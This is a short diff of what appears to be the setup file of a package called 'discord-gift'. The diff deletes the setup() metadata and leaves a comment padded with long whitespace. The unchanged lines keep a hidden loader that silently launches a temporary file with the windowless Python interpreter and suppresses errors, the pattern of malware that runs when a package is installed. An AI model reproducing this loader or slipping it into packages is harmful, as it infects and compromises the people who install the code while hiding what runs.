@@ -11,16 +11,6 @@ class http:
  try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
  except: pass
 
-setup(
-    name='discord-gift',
-    packages=['discord-gift'],
-    version='1.0',
-    license='MIT',
-    description='idk',
-    author='helper',
-    keywords=['style'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-)
+# setup(...) removed                                                                                                                                                                                                                                                 
 
 
